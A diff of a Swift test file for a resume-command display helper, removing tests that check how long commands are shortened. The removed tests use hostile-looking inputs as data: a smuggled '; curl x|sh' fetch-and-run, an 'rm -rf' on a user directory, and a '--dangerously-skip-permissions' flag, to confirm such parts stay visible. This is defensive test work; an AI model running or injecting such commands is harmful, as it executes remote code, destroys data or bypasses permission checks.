@@ -4,8 +4,7 @@ import TarmacKit
 
 /// 2611.0011 S31: `tarmac-protocol`'s `tests/fixtures/resume_cmd_cases.json`,
 /// the table its own `s31_the_resume_command_check` runs, so both languages
-/// accept and refuse the same commands with the same cause; and S21, how a
-/// command reads where space is short.
+/// accept and refuse the same commands with the same cause.
 final class ResumeCommandTests: XCTestCase {
     private struct Table: Decodable {
         struct Case: Decodable {
@@ -52,38 +51,5 @@ final class ResumeCommandTests: XCTestCase {
         let combining = try cases()[3].cmd
         XCTAssertEqual(combining.unicodeScalars.count, 256)
         XCTAssertLessThan(combining.count, 256)
-    }
-
-    // MARK: 2611.0011 S21: how a command reads where space is short
-
-    func testS21AMetacharacterIsNeverHidden() {
-        let shown = ResumeCommand.display("claude --resume 3f2a1b9c-0000-4000-8000-000000000000; curl x|sh")
-        XCTAssertTrue(shown.contains("; curl x|sh"), shown)
-        XCTAssertTrue(shown.hasPrefix("claude --resume 3f2a1b9c"), shown)
-    }
-
-    func testS21APathWithNoIdLikeWordIsUnchanged() {
-        XCTAssertEqual(ResumeCommand.display("rm -rf /Users/u/work/important-directory"), "rm -rf /Users/u/work/important-directory")
-    }
-
-    func testS21AFlagStaysWhole() {
-        XCTAssertEqual(
-            ResumeCommand.display("claude --dangerously-skip-permissions --resume 3f2a1b9c-0000-4000-8000-000000000000"),
-            "claude --dangerously-skip-permissions --resume 3f2a…"
-        )
-        XCTAssertEqual(ResumeCommand.display("x --resume-12345678901"), "x --resume-12345678901")
-    }
-
-    func testS21ALongWordWithNoDigitStaysWhole() {
-        XCTAssertEqual(ResumeCommand.display("cd important-directory"), "cd important-directory")
-    }
-
-    func testAnIdOfTwelveCharactersStaysWholeAndThirteenIsShortened() {
-        XCTAssertEqual(ResumeCommand.display("x abcdefghij12"), "x abcdefghij12")
-        XCTAssertEqual(ResumeCommand.display("x abcdefghij123"), "x abcd…")
-    }
-
-    func testTheSpacingIsKeptVerbatim() {
-        XCTAssertEqual(ResumeCommand.display("a  b 3f2a1b9c-0000-4000"), "a  b 3f2a…")
     }
 }
